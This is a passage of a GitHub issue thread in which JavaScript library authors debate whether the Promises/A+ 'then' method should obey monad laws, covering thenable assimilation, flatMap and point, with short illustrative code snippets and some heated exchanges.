The `constructor.point` function probably has some details that can be discussed better in [the issue that Raynoes opened](https://github.com/promises-aplus/resolvers-spec/issues/24).

The changes to `then` are the hard ones to justify. You ask for `then` to only accept functions that return promises. I agree that separate methods would be easier to follow and probably less complex to maintain. However, that's something I think we can agree that it's way too late to change. You yourself concede:

> I don't really care about having bind fall back to map when it doesn't return a promise

This leaves `then` taking only one argument and having a separate `onRejected` method. And I honestly can't see the reason. `then` taking two arguments is really useful because of the default behavior of the second argument. When it's not provided, it's just chained to the next `then` call, allowing you to listen to failures in only one place. On top of that, `then(callback, errback)` looks like just a superset of `then(callback)` which you could ignore for inter-operability with other monad-like objects. And `onRejected` could just be a wrapper for `then(null, fn)`.
"
5123	"I am so happy that everyone's on the same page now :smile:.
"
5124	"This has been a fascinating and entertaining thread!  The best one in
promises-aplus so far!

I am fully in favor of seeing the bright minds here do the thought
experiment to see if something more monad-like can replace promises -- even
in Javascript.

Might I suggest that we pursue this as a thing to follow the ratification
of 1.1?

-- J

On Wed, Apr 10, 2013 at 4:23 PM, Michael Ficarra
notifications@github.comwrote:

> I am so happy that everyone's on the same page now [image: :smile:].
> 
> —
> Reply to this email directly or view it on GitHubhttps://github.com/promises-aplus/promises-spec/issues/94#issuecomment-16199525
> .
"
5125	"@juandopazo 

>  The first one is how to create monads/promises of the same type of another one.

It's not that we want to create an `ArrayPromise` that inherits from Promise. It's that we want to create a `List` thing that is a ""monad"" meaning it has a `flatMap` and `point` operator of some kind.

We can consider `then` as a being a superset of `flatMap`.

We want to write higher order functions on things that look like Functors (it has a `map` function), Monads (it has a `flatMap` and `point` operator) and other such constructs.

For example 

``` js
function double(input) {
  return input.flatMap(function (x) {
    return input.constructor.point(x * 2)
  }) 
}

function PromiseMonad(p) {
  p.flatMap = p.then
  p.constructor.point = Promise.from
  return p
}

function ListMonad(arr) {
  return { 
    flatMap: function (f) {
      return [].concat.apply([], arr.map(f)
    },
    constructor: { point: function (x) {
      return [x]
    } } 
  }
}
```

We've now written `double` function that works on both a list of numbers and a promise for a number. We can extend it to also work on a stream of numbers and work on a function that takes a callback and returns a number and etc etc etc.

The thing to take away is not ""monads are better then promises"" it's that the `.then` semantics on an `ArrayPromise` probably make more sense if the `onFulfilled` function was called multiple times with every single value in the array and that the _array_ returned from the `onFulfilled` function were concatted together to create a new `ArrayPromise`. 

Now of course this breaks the `then` semantics so it makes more sense to just deal with this as an abstract monad with an abstract `flatMap` operation.
"
5126	"> On top of that, then(callback, errback) looks like just a superset of then(callback) which you could ignore for inter-operability with other monad-like objects.

Sort of. It is possible to exploit the function's arity (via `f.length`) to make partial function application more normal. In Haskell, if you have `f :: a -> b`, then `f a :: b`. However, in Javascript, `f.bind(undefined, a) :: () -> b`. If you check f.length (and make assumptions about varargs), you can make something that behaves more normally. I suspect this would be important for implementing `ap`.
"
5127	"@juandopazo awesome.

As you notice, `then` is just an overloaded `bind`/`flatMap`. Great.

I'm happy to discuss `point`/`from` in [resolvers-spec](https://github.com/promises-aplus/resolvers-spec/issues/24).

So handling errors will just require users to do `then(null, fn)` - that's awful but I'll live with it.

Sounds like it should be possible to make an implementation that is both Promises/A+ compliant and also compliant with what I'm proposing.

Thanks.
"
5128	"I'll chime in. I really have no idea about category theorey and the term monad
is scary. I really didn't get it till I started looking at f# computation
expressions then it just clicked. 

Monads are really just a set of callbacks for `an interpreter`. The language
that is interpreted can look imperative if you choose so. 

F# has taken this to it's logical conclusion with `computation expressions`.
http://msdn.microsoft.com/en-us/library/dd233182.aspx, an imperative embedded
language where `you the developer` can define what each language keyword
means via callbacks ( Monad methods )

Why is this good. Well functional programming is good but often you
ended in nesting hell. Hence all the requests for async / await type
keywords to flatten out the nesting in javascript. 

`computation expressions` are a generalization to all kinds of
flattening problems introduced by functional programming.

So in the context of this discussion making sure all your monad thingies have
all the correct standard interfaces makes it possible to do things like
`computation expressions`  

So for example in F# you can do

```
open System.Net
open Microsoft.FSharp.Control.WebExtensions

let urlList = [ ""Microsoft.com"", ""http://www.microsoft.com/"" 
                ""MSDN"", ""http://msdn.microsoft.com/"" 
                ""Bing"", ""http://www.bing.com""
              ]

let fetchAsync(name, url:string) =
    async { 
        try 
            let uri = new System.Uri(url)
            let webClient = new WebClient()

            // IMPORTANT BIT HERE. The code after the let!
            // executes asynchronously. Even the exception
            // handing is handled asynchronously :)

            let! html = webClient.AsyncDownloadString(uri)
            printfn ""Read %d characters for %s"" html.Length name
        with
            | ex -> printfn ""%s"" (ex.Message);
    }

let runAll() =
    urlList
    |> Seq.map fetchAsync
    |> Async.Parallel 
    |> Async.RunSynchronously
    |> ignore

runAll()
```

Note that the `async` keyword is just telling the compiler/interpreter
that in this scope the monad interpreter will use the `async workflow`

There are callback interfaces for most of the standard f#
keywords even loops and exception handling.

So in summary don't get scared off by terms like Monads
and Categorey theory. Think of Monads as callbacks for an interpreter
for an imperative language where `you` can define what each
keyword in this language does. Everybody agrees on the
language and everyone is free to implement any callbacks 
they like.

But to get it all to work you need to agree on a common
set of interfaces. 
"
5129	"Thanks to the Promises/A+ folks for asking really good questions, and thanks to @pufuwozu (and others) for answering with lots of good information and examples.  I'm basically in favor of anything that makes promises ""better"" and more useful, without also making them less approachable/learnable.

My main concerns are:

Approachability/Learnability - it's been the experience of many Promises/A+ contributors that Promises, in general, already are daunting to developers.  It's at least been my experience that Monads, in general, can also be daunting to folks.  I think that we need to be careful not create something that is even harder for developers to grok/use.  As  a super simple example, I fear that the name `point` is not intuitive for what it does, and would confuse many developers.  It's great that @pufuwozu has said over in #24 that he's cool with one of our previously proposed names `from`.  If monadic promises can be theoretically strong, _but also_ no more difficult to learn, I think that kind of synergy of theory and practicality can be a big win.

Interoperability - there's a substantial and growing amount of deployed code based on non-promise thenables, Promises/A, and Promises/A+.  I think we have to consider that, and make sure we don't break the world.  For example, changes to the signature and/or behavior of `then` could be a big barrier adoption, or worse, could cause developers some serious headaches.  Again, it _seems_ like it's possible to move forward in a way that maintains compatibility/interoperability, but it's something we need to keep in mind as we explore this approach.

Promises/A+ 1.1 timing - This version is effectively ""done"", and I think we should release it.  We can continue to explore monadic promises for a subsequent version.

DOM Futures - It's not clear to me how this could/would/should influence the current DOM Futures work, but maintaining compatibility seems very important.  I'm hoping someone more involved with that effort (@domenic, @erights, @wycats?) is able to comment.

It would also be good to hear from other lib authors, especially @kriskowal, @erights, @wycats, @lsmith, and @novemberborn.
"
5130	"@briancavalier As far as approachability/learnability goes, I believe Monads provide a much simpler interface for Promises/A+ (even ignoring the ""being more composable"" argument, which is a rather strong one). I think we should value simplicity over a seemingly easy but complex API (plus we get more compositionality yay!). The current specification for `then` is really complex, it merges lots of concepts and deals with a fair bit of automatic conversion for the user. While this does allow a particular user ""type less"" in the general case, it's not something that really scales on the long run (see the Abstract Equality Operator).

People don't need to be concerned about what Monads are or aren't to **use** Promises. I think that's an important part of this discussion I don't recall people mentioning before. Users who don't get Category Theory, Monoids, Monads, Functors, Applicatives and all that stuff (which would include myself for now :3) can just look at this whole thing as more combinators. Functional idioms are beginning to spread throughout the JS community, even though people don't grok all the internal details of those idioms: function composition, generic and specialised folds, etc. So I think it's worth a shot working together to construct an API that is simple (by the means of separating and composing concerns instead of overloading things), and still uses a vocabulary that is slightly more familiar to JS developers to help with adoption.

Interoperability is a problem. For example, by changing the behaviour of `then` and making it simpler, we will have to ask all previous implementors to adapt to the new specification. Abstractions built on top of those might also need to some rework. However, sometimes breaking backwards compatibility can be worth it.
"
5131	"Just got reminded by @dherman - anything with a `then` is a ""Thenable"" which is treated specially in the spec.

If we also put a `then` on Array - things would seriously break when an array is returned from a function passed to promises libraries!

There's two choices:
- Not everything with a `then` method can be treated as a promise Thenable
- The `then` method shouldn't do special things when value returned from the function doesn't have a `then` - we can't have libraries rely on that behaviour

One of these things really needs to change to allow DRY code.
"
5132	"To be exhaustive, here's two more choices:
- Let promise libraries break when we add things like `Array.prototype.then`
- Don't write DRY code

I know some people will reach for that last option but I don't want to give up :smile: 
"
5133	"OK. So. People seem to not have understood how bad of a mismatch @pufuwozu's post was for Promises/A+, both in content and in tone. Let's try to clarify that, and hopefully make it clearer why I stand by my original post.

First, coming into a community and saying ""you're doing it wrong! look over here!"" in a post filled with technical inaccuracies and misunderstandings is rude and unwelcome. Compounded with well-known troll @paulmillr, of racist CoffeeScript pull-request fame, as the messenger, you can see how this is problematic.

Now, let's get down to brass tacks. Although @pufuwozu has backed off on his `onFulfilled`-must-return-a-single-type argument, the general perspective from which such a demand comes from is unrealistic, and indeed stems from a typed-language fantasy land where you can enforce such things and don't have to think about the possibility of receiving an unwelcome type. Indeed, his suggestion to leave returning non-promises unspecified is ridiculous for a JavaScript _specification_.

Furthermore, the problem isn't only a narrow typed-language worldview. It's a narrow pure-functional language worldview as well! Promises are an implementation of the monad pattern that helps to encapsulate an exception channel into the monad. That much is, I hope, obvious to all. But a key part of how promises implement this pattern is by embracing the imperative nature of the language, and automatically translating `return` (of non-thenables) and `throw` into the appropriate promise representation. Any implementation of monads that is ""right"" for JS will necessarily embrace these imperative possibilities, instead of ignoring them.

Finally, there seems to be a crucial misunderstanding of what the Promises/A+ spec is meant to do. It is not meant to dictate a standard for all aspects of promises in JavaScript, and it is _certainly_ not meant to provide a standard for monads in JavaScript. Instead, it is something that grew out of many years of implementer experience, and the need to provide a minimum interoperable specification of the `then` method. As such much of its complexity is focused around interoperability (see the entire Promises Resolution Procedure). Remember:

> A standard for sound, interoperable JavaScript promises—by implementers, for implementers.

This is why decisions like promise creation are not part of the core specification, while in contrast, we do carefully specify thenable _assimilation_.

I think the key here is **something that grew out of many years of implementer experience**, and more importantly many years of _JavaScript_ experience. We have found an appropriate implementation of a specific monadic pattern in JavaScript, and that includes things like how we handle exceptions, how we handle polymorphic return values, and how we duck-type other implementations of the same pattern. This also feeds into discussions of flattening promise chains; it has previously been discussed over and over that a promise-for-a-thenable is a problematic pattern in JavaScript and should not be supported. (A promise for another monad, of course, is fine.)

In contrast, nobody has spent years implementing algebraic patterns in JavaScript. If they had, I think we'd be having a very different discussion right now, with much less focus around Haskell idioms and much more focus around those types of issues. The insistence of some people in this thread that the Haskell (or Scala, or...) implementations of these algebraic patterns is what we should do is very misguided.

I fully support any efforts to try to come up with some standard way of expressing monads and other algebraic concepts in JavaScript. Preferably, it should embrace the language instead of trying to make it conform to patterns of languages from other paradigms. But that's not something I am interested in spending time on as part of Promises/A+. I think a separate GitHub organization, perhaps with overlap from those who seem interested, is the right place to do such work.

In the meantime, Promises/A+ has no intention of incorporating whatever nascent ""monad standard"" such an organization comes up with. Neither, I think I can safely guess, does the DOM Standard and their DOM Futures.

Indeed, I think the standardize-first approach is the wrong one; it is certainly the opposite of what we have done with Promises/A+. Rather, I'd suggest going off and building libraries, with appropriate wrappers---one for Promises/A+ promises; one for arrays; one for an option type implementation; etc. If you have, after a few years of experience, managed to create a pattern that is widely used in libraries as popular as jQuery, Ember, Angular, WinJS, and more (perhaps with some flawed implementations, like jQuery's, lol): only _then_ should you write up a spec, and a test suite. You need those years of experimentation to determine what the spec should even _say_.

_Finally_, after those years of experimentation, and the subsequent months of hammering out a standard, _then_ come back to us. _Maybe_, if you've built an extremely compelling ""algebraic JavaScript"" ecosystem, Promises/A+ would consider a 2.0 revision in which we effectively tell all Promises/A+ implementations that the benefits are compelling enough that they should implement these new APIs as well. Most likely, if you're indeed that successful, most Promises/A+ implementations will already have adopted your patterns, and it'll just be a matter of codifying de-facto reality into something with all the edge cases smoothed out---like we have done with Promises/A+ 1.0 and 1.1.
"
5134	"@domenic 

> it has previously been discussed over and over that a promise-for-a-thenable is a problematic pattern in JavaScript and should not be supported.

Except that the current behaviour of `then`, while allowing for compatibility with all sorts of previous work, is confusing, and rather prone to break **exactly because of the overloading**.

Someone returns a thing  that has a `then` method and is fed into a Promise function? Broken. Someone use a Parser Combinator library that uses `then` for sequencing actions but no promises, feeds that into a promise-expecting function? Broken. How does the user reason about that? Well, he doesn't, and that's what is **really** terrible about Promises/A+.

Specially if Promises/A+ gain enough traction to be used everywhere as they should, consider:

``` js
var compileP = liftNode(compile) // compiles AST to something
var flattenP = liftNode(flatten) // flattens and optimises AST
var parseP = liftNode(parse) // parses text, returns AST
var source = fs.createReadStream('source.foo')
var compileSourceP = compose(compileP, flattenP, parseP)
spit(process.stdout, compileSourceP(slurp(source)))
```

Now, consider `spit` is a function of type `spit :: Promise Stream, Promise String -> Promise ()`, and slurp is a function of type `slurp :: Promise Stream -> Promise String`. `parse`, `flatten` and `compile` are straight-forward in meaning, but they are **not** functions that know about promises, they are just wrapped in a function that transforms the arguments into a Promise, applies the function, and wraps the return in a Promise.

The problem now is all of those functions need to use `then` to wait for a promise to be resolved. Let's say the `AST` happens to have a `then` method for whatever reasons, this means we wouldn't be able to write that code, because `flattenP` would try to assimilate the return of `parse`, which is not a Promise.

See also @pufuwozu's comment above yours.

Is @pufuwozu filled with Haskell's dogmatism? I don't think so. Could he have worded his proposal better? Perhaps. Does he raise good points that we should evaluate? I think he totally does. Even if we disregard the whole ""monads-category-theory-functional-programming-narrow-minded-pure-theoretical-ideas"", there are some problems with the specs right now, which will mean things are gonna be fucked up as people begin to use them more and combine them with regular values. This is made **worse** by JS's lack of type constraints.

> Indeed, I think the standardize-first approach is the wrong one; it is certainly the opposite of what we have done with Promises/A+.

It's also one of the things that bring in some terrible incidental complexity because now you have to support all of the previous work on this front. Same happened with ECMAScript. And is happening with ES6 again. Accidental complexity is never something we should strive for, imho.

As a side note, the tone of this discussion is really not helping. Fights means people get more defensive and less open to other people's ideas, which is, I believe, not what we want here(?).
"
5135	"@domenic my implementation of `point` is wrong - where are my other technical inaccuracies and misunderstandings? You haven't commented on them.

> ... and it is certainly not meant to provide a standard for monads in JavaScript.

It's not - but let's at least make it compatible! What was the reason not to?

> Furthermore, the problem isn't only a narrow typed-language worldview. It's a narrow pure-functional language worldview as well! ...

That **whole paragraph** has _nothing_ to do with what I've been talking about. The API that I derived is not pure at all. Thinking that this has anything to do with purity is _absolutely wrong_. I have no idea where you got that idea.

> I think the key here is something that grew out of many years of implementer experience...

You can't just say ""we've spent years implementing X, so it doesn't have to do/be Y"" - that's absolutely useless. Give a reason, not an argument from authority.

> ... and more importantly many years of JavaScript experience.

I have been writing hobby JavaScript for 11 years - professionally for quite a few of those years. I write a few serious JavaScript libraries. I'm not coming in here from _outside_ of the JavaScript community (not that it should matter, at all).

I also use many other languages - does that make your JavaScript experience more important or something?

> We have found an appropriate implementation of a specific monadic pattern in JavaScript, and that includes things like how we handle exceptions, how we handle polymorphic return values, and how we duck-type other implementations of the same pattern.

They're not monadic - that's the whole point. What you're doing _could_ be monadic - it's very close!

> Preferably, it should embrace the language instead of trying to make it conform to patterns of languages from other paradigms.

Why do you have this crazy idea that because Haskell recoginises that monads are monads, then we're trying to make JavaScript like Haskell? You're being very dishonest.

The API that you can derive makes sense _algebraically_. This has nothing to do with Haskell or Scala.

> In the meantime, Promises/A+ has no intention of incorporating whatever nascent ""monad standard"" such an organization comes up with.

Useless.

> Finally, after those years of experimentation, and the subsequent months of hammering out a standard, then come back to us.

Wait, so is it absolutely no or maybe?

Come on. I read all of that for nothing - there's no content!

I have not seen any reasonable excuse against recognising that promises are monadic. You've basically come up with ""it's pure"" (incorrect), ""it's from Haskell"" (incorrect), ""it's not from JavaScript"" (that's what I'm trying to fix) and ""implementors made this - we don't need your input"" (urgh, thanks).

Anyway, I'm going to reiterate our 4 choices:
1. Use something other than checking `then`
2. Remove `then` which does special things for when returned with no `then`
3. Let the promises that implement this spec break when used with DRY code
4. Don't write DRY code

Yes, all the options suck. Problem is that I think #4 sucks the most.
"
5136	"@killdream the issue of things which have `.then` methods but aren't ""thenables""[1] is vastly overstated.  I haven't seen a single issue on GitHub about a bug resulting from this behavior.  Given that I work on projects that use promises (both my own and other people's) almost every day, I would've seen hundreds if this was a significant problem.  It just isn't.

[1] thenable: (something close enough to a promise to be successfully assimilated
"
5137	"@ForbesLindesay I added a `then` method to `Array`. Everything broke. Want to file an issue for that?
"
5138	"OK, I've now seen one person with a problem resulting from this, and you extended the prototype of a built-in.  There are exactly 2 reasons why that would be acceptable:
1. You're experimenting with an API you hope will be considered for a future version of JavaScript.  What you've just demonstrated is that adding such a method would break lots of websites, so it won't be added.  That concludes your experiment.
2. You're shimming functionality that is already either in at least one JavaScript environment (browser or node.js) already or has been specified within a standards body with sufficient backing.  The promisesA+ standards body doesn't yet carry that kind of weight, you most certainly don't.
"
5139	"@ForbesLindesay urgh, missing the point.

I just wrote a wrapper around `Array` and added a `then` method. Everything broke!
"
5140	"@ForbesLindesay I'm okay with assimilating promises when you return a promise from a function in an `on{Fulfilled,Rejected}`, I'm not okay with assimilating things with a `then` function. That it hasn't happened until now doesn't mean it will never happen (potential ≠ guaranteed). For example, `null` is a terrible API design, everyone agrees with it, but even so `null` references are only ""potential"" problems.

Specially problematic with things that looks like thenables but aren't quite. Duck-typing is not the way to go here because the semantics of a `Thenable` are really important for them to be assimilated successfully, and these kind of errors might not exactly be **early errors**, which is more of a problem because now you have to step through your whole code base to figure out what went wrong. Dynamic branding would be a better option to mark compliant promises specifically and only assimilate those. Then the user has to go through all the trouble to wrap foreign things that are close to promises, which ensures they won't shoot themselves on the foot by a seemingly innocent code like the one in my example above.
"
5141	"@ForbesLindesay I wrote this:

```
function Id(a) {
    this.value = a;
}
Id.of = function(a) {
    return new Id(a);
};
Id.prototype.constructor = Id;
Id.prototype.then = function(f) {
    return f(this.value);
};
```

Everything broke!
"
5142	"@pufuwozu seems to be arguing that Promises/A+ ought to be compatible with monads because it only requires a small change and doesn't have any significant drawback.

@domenic seems to be arguing that the drawback is insurmountable, but I'm not seeing where this is demonstrated.

> Indeed, his suggestion to leave returning non-promises unspecified is ridiculous for a JavaScript _specification_.

Why is this ridiculous? jQuery doesn't specify what happens when you pass a hundred arguments to $(foo).siblings - does it need to? JS is a dynamic language. There are all sorts of unspecified legal actions; as JS authors, we are used to that.

> Compounded with well-known troll @paulmillr, of racist CoffeeScript pull-request fame, as the messenger, you can see how this is problematic.
> I think the key here is something that grew out of many years of implementer experience, and more importantly many years of JavaScript experience.

Serious question: when people argue with you using ad hominem attacks and bludgeoning you with their credentials, does that make you more likely to think that (A) they are probably right after all, or (B) they are digging in their heels for pride rather than what's best?

Please reconsider.
"
5143	"@killdream ""Let's say the AST happens to have a then method for whatever reasons,"" Don't do that.

The original E promise API which inspired all these others has no assimilation. When I first heard about assimilation, I thought it was a terrible idea, for many of the same reasons that underlie many of the above objections. However, as I saw the JS promise landscape evolve, I despaired more over a worse problem: 

Several similar but different elephants in the room: jQuery promises, WinJS promises, Q promises, and DOMFutures. All of these but DOMFutures have enough installed base that they're not going away. And re DOMFutures, never underestimate the ability of the w3c to be an elephant even for premature ""standards"". Much code will have to be written in an environment inhabited by multiple such promise systems simultaneously. If none of these recognize each other's promises as anything promise-like, then programmers will face the burden of dealing with a ""jQuery promise for a Q promise for a WinJS promise for a DOMFuture for a number"". Call it the JQPFAQPFAWJPFADFFAN problem. I didn't see how we could get from that situation to one with an agreed standard promise anything.

Fortunately, the starting point for all of these elephants was so similar that the Promises/A+ process was able to tease out and codify a common-enough ground for all of these to agree on. This is messy real-world standards work; as much politics and sociology as technology and math. Given the constraints imposed by legacy, we should all be overjoyed that the Promises/A+ community has been able to extract something as beautiful as they did. But even if they all agreed on exactly the same spec, so long as jQuery promises only recognize jQuery promises as promises, and likewise for the others, we would still have the JQPFAQPFAWJPFADFFAN problem.

Had ES6 with its unique symbols happened long before any of these promise libraries, we could have used a unique ""@then"" symbol for assimilation and so avoided the accidental collision @killdream worries about above. Likewise, if all of these had stuck with the E (or original Q) name ""when"" rather than renaming it ""then"", we would have less accidental collision, and would be less irritating to category theorists. (FWIW, I think ""when"" was a much better term than ""then"" for this anyway. I am still unclear on the history of how this got renamed.) Alas, it didn't turn out that way.

Given multiple promise systems that each recognize only their own promises as promises, but which mostly agree on the meaning of ""then"", assimilation turns out to be a surprisingly pleasant way for these to co-exist. Given the actual situation we have to start from, having this assimilation be based on duck typing on the presence of a function named ""then"" is unfortunate, but there was no other practical choice.
"
5144	"@rtfeldman the comparison with jQuery is completely out of place here for two reasons:
1. jQuery sucks at things like this, check out their broken promises.
2. jQuery isn't a spec, so it's completely different.

A fair comparison would be the ECMA Script spec, which almost always specifies these corner cases (the only reason it would ever not do so would be by mistake.
"
5145	"@pufuwozu Your Id object:

``` js
function Id(a) {
    this.value = a;
}
Id.of = function(a) {
    return new Id(a);
};
Id.prototype.constructor = Id;
Id.prototype.then = function(f) {
    return f(this.value);
};
```

Looks plenty enough like a promise to me, when I assimilate it using a true Promises/A+ library I get a promise which resolves to the value of the Id.  That's well specified, well defined behavior.  I've found it helpful hundreds of times, and never found it a problem, and nor has anyone else.

@killdream 

> never happen (potential ≠ guaranteed)

Yes, but JavaScript is not a language that concerns itself greatly with proving things.  Pragmatically speaking, I don't think it will cause anyone problems unless they are trying to abuse promises to make them more like Haskell Monads, as such, I don't think it's a problem.  We considered ""branding"", but that ultimately causes the same problems, just one down the line: ""It doesn't matter how many `_`s you add to the start of a property in JavaScript, it's still public"".
"
5146	"@ForbesLindesay Fair point that jQuery isn't a spec.

Here's the ECMAScript 5.1 spec on `Array.prototype.reduce`: http://www.ecma-international.org/ecma-262/5.1/#sec-15.4.4.21

> 1. If len is 0 and _initialValue_ is not present, throw a **TypeError** exception.

This is the ECMAScript spec saying ""if you pass an empty array and no starting value to `reduce`, that doesn't make sense, so TypeError.""

Granted, explicitly specifying ""throw a **TypeError**"" is not the same thing as leaving it unspecified, but this is certainly an example of a JS spec saying ""you can't use certain types in places where they don't make sense,"" no?
"
5147	"@rtfeldman effectively saying ""you can't use certain types in places where they don't make sense,"" by deterministically throwing a TypeError is fine. Unspecified isn't. Care to rephrase what you had in mind in as a deterministic spec?
"
5148	"I'm not certain that I understand the problem here.  As understood, the following are equivalent:

``` cofeescript
p.then(onFulfill, onRejected)
```

and

``` coffeescript
p.then(onfulfilled, undefined)
p.then(undefined, onRejected)
```

indeed, many implementations provide single-function shorthands.  And of course, a full two-argument could be built from those single-function shorthands, thus

``` javascript
function then (onFulfill, onReject){
  p.shorthandFulfill(onFulfill)
  p.shorthandReject(onReject)
}
```

It would seem, then, that nothing in the Promise/A+ spec precludes the use of a promise as a monad, and the monadic promise proposal does not preclude the use of a promise as a practical notation for asychronous behavior.  Given that Javascript and the spec provide that .then(oneCallback) operates the same under each proposal, the debate seems unnecessary.

Why choose?

The question is only how the notation for the spec should be accomplished.  I agree with the overarching sentiment that we should describe the specification, so much as possible, using notation that users and developers understand.  In this way, clients can read the spec and comprehend what is happening.  Category theorists can use the spec trivially and without translation.  And there is no reason why it can't be pointed out that distinct uses of the .then functions result in monadic behaviors.

The .then position is only one of a few pieces of the proposal, but I simply don't get this piece at all.  I will write separately about the other issues.
"
5149	"@ForbesLindesay @pufuwozu's example breaks depending on the assumptions the developer has when he wrote the `Id` constructor. If he doesn't expect it to be assimilated by a Promise library, it's broken.

@erights Legacy and incompatible things are unfortunate, which was I said all that stuff about accidental complexity. I believe explicitly wrapping non-conforming implementations would be best. Have a function like `promiseFromThenable(a) :: Thenable a -> Promise a` the developer can use to explicitly glue alien functions together, but I haven't really considered edge cases.

My example with the AST was based on the assumption I don't control that library. @polotek seems to have a Node library with a `then` method that isn't a promise. Promise-expecting functions can't use that library as a result.

@ForbesLindesay I actually think the probability of these kinds of things increase as you use Promises as actual Promises, because then you'll be mixing them with all the sorts of regular values, and it won't be apparent from your code base what is a promise and what isn't. If I omitted most of the definitions of my example, it would be one of those cases:

``` js
// is `source` a thenable? Is the result of `slurp? The result of `parse`? The result of `flatten`? ...
spit(process.stdout, compile(flatten(parse(slurp(source)))))
```
"
5150	"@polotek Please fix your Node library. Thanks in advance.

@killdream yes, until @polotek fixes his library, it can't co-exist with various promise libraries. It is far too late to do anything to fix that. The evolution of JavaScript has always been and remains constrained by its history of usage.

@wizardwerdna ""p.then(onFulfill, onRejected)"" evaluates to a promise for the value that the invoked callback will return. What does ""p.then(onfulfilled, undefined); p.then(undefined, onRejected)"" evaluate to?
"
5151	"@killdream

I use promises is in all sorts of large real world applications.  Some of which are closed source, but there are some notable exceptions such as [esdiscuss](https://github.com/esdiscuss/esdiscuss) and the now deprecated [component-website](https://github.com/ForbesLindesay/component-website).  You just don't end up suffering these issues.

As for your idea of forcing people to explicitly convert thenables into ""Promises"" it simply doesn't work.  There is no sure fire way to tell the differences between a Promises/A+ promise and a thenable.  Branding would get close, and was considered, but ultimately rejected.  Search through the issues if you want to see more.

@wizardwerdna 

There's a slight problem, you're neglecting the return value of then. `p.then(onFulfilled, onRejected)` is actually equivalent to:

``` js
(p will be fulfilled) ? p.then(onFulfilled, undefined) : p.then(undefined, onRejected)
```

Unfortunately `p will be fulfilled` is uncomputable
"
5152	"Another piece of brian's article goes to his ""point"" function.  This functionality already exists in several libraries, typically named ""coerce"" and sometimes referred to as ""assimilate"".  Indeed,the newest spec requires an ""abstract procedure"" called Promise Resolution Procedure, which is often manifest in code as `resolve(thingie)`.  This is nothing more than exposing `resolve` to the API.  On the other hand, since it can easily be coded from the already-specified API, why does it matter?

Indeed, let me ask this question.  Since the monadic use of Promises/A+ can be built completely from the spec, why not consider it simply to be a mixin that makes a Promise into an MPRomise?
"
5153	"erights, you got me.  How about

``` coffeescript
p.then(onFulfilled, undefined).then(undefined, onFulfilled)
```

This returns a promise for the state and value that the invoked callback will return, albeit through a chain of promises via the Promise Resolution procedure.
"
5154	"That one is much more obviously different.  Consider what happens if `onFulfilled` throws an exception.
"
5155	"The nonstarter in Brian's proposal, in my view, is the following:

> I think then should only take the onFulfilled function and it should have unspecified behaviour if the function doesn't return a promise (for simplicity; map can be derived).

I simply don't think that we are all that hung up on types here in the land of javascript, and the /A+ specified behavior seems intuitive to me.  Since Brian doesn't care (his definition permits the existing usages), the /A+ spec seems to do what he wants, just more.
"
5156	"@wizardwerdna well, it's tricky to explain.

If we have other things that have `then` because they're all monads - then adhearing to the promises spec promises that you'll be stuff when I pass a monadic Array in.

If the promises spec doesn't specify that it should fall back to map, then some libraries can reject that behaviour and give early errors.

It's not about types.
"
5157	"@ForbesLindesay 

Perhaps I was unclear.  Considering the chained expression, as compared to the two-parameter version, doesn't the return promise in each case end up rejected with the error of the onFulfilled call.
"
5158	"@wizardwerdna: In your chained example, if the onFulfilled callback fails, then it will be called again, but with an error instead of whatever was originally passed.
"
5159	"@pufuwozu Brian, trying to follow.  Can you give an example?  As understood, you can still wrap the old library behaviors with a coerce function.

Invariably, you will ordinarily try to use just one library anyway, resorting to other objects only when, for example, an I/O or Ajax library returns an ugly out-of-library ""thenable"".  But its a trivial matter to use the coercion procedure for any return value, or better yet, to define a library-version of the external API calls, returning ""legit"" promises.

My point is that the present Spec seems multi-purpose, and the limitations on their use proposed by Brian seems easily built atop it.  If I am not wrong, what's the beef?
"
5160	"@Twisol OK, I get it.  The two-parameter version will only ever call the first callback, and the then-promise rejects with the error.  The two-step version, errors out, so the then-promise rejects with the error, triggering the second callback.  This is a semantically important consequence of the one-callback-only limitation of the spec.

Thus, I agree that we don't have equivalence, in that the monad can't seem to readily reproduce the A+/spec version.  But doesn't it work fine the other way, in that the monadic version can be replicated by the spec?  Thus, why the sadness in the monad community, since the spec already gives them what they want.  Defining `monadThen` as `function monadThen(cb){specThen(cb);}`  and `monadOnRejected` as `function monadOnRejected(cb){specThen null, cb);}`
"
5161	"@wizardwerdna so here's my ""monad spec"" for JavaScript:

A monadic value is something that:
- `then` takes a function which takes a value and returns a monadic value of the same constructor - `then` also returns a monadic value of the same constructor
- `constructor.of` creates a monadic value of the same constructor

It also has to obey these laws:
- `of(a).then(f)` is the same as `f(a)`
- `m.then(of)` is the same as `m`
- `m.then(f).then(g)` is the same as `m.then(function(x) { return f(x).then(g); })`

Great, promises implements part of this specification (and hopefully more, soon). Awesome.

I make my `Id` constructor implement the above monadic specification - now I pass it to a promise library. Uh oh, it also has `then` so promises thinks it's a Thenable and does strange things with it. It's buggy.

It's not about promises not being part of ""the monadic spec"" - it's that promises will break when there's more than just promises involved.

Should I move forward with implementing many things with `then` and just let promises break? Or should promises change to not let this happen?

Does that make sense now?
"
5162	"@pufuwozu Don't define then methods that don't conform to the Promises/A+ spec. If you want a then-like method with a different behavior, call it something else.
"
5163	"@erights but Promises/A+ already provides a compatible `then` method. They are close to monadic. It's a problem with promises if they do strange things with other monads. They shouldn't.
"
5164	"It's really sad that @erights highlights how tied we are to a stripped version of structural typing where every superset of `{ then :: Function }` is considered a `Promise` =/
"
5165	"@wizardwerdna: Yes, that's right. Since the 2-ary `then` is strictly more powerful than `then` and `otherwise`, you can implement both of them in terms of the former. I do think that the 2-ary `then` should be called something else, but that ship sailed a long time ago.

The thing is, there are other things in Promises/A+ that you have to be careful of. Despite @pufuwozu's statement that ""it's not about types"", there are a lot of design tradeoffs based on the very fact that you _can't_ differentiate types beyond a certain level of complexity. Have a single type you want to handle specially? Great, use instanceof. Have a whole range of types that have to implement an interface? That kind of check, in Javascript, ends up with problems.

And unless you want to use a transpiled Javascript language, there are no good solutions to the problem which also keep things at an approachable level. I admire @pufuwozu's approach to functional techniques in [bilby](https://github.com/pufuwozu/bilby.js), but it forces a total paradigm shift that most developers won't want to deal with. We could refactor `then` into separate `bind`\- and `fmap`-alike methods, but in JavaScript that just makes them more brittle.

@pufuwozu:

> It's a problem with promises if they do strange things with other monads. They shouldn't.

If we had a stronger type system, the Promise methods wouldn't even _accept_ other monads as input. Functions that are total in statically typed systems are partial in JavaScript - and we don't even have a good way to restrict the domain manually. It sucks. :frowning:
"
5166	"@Brian could you explain what strange things might happen in the context of
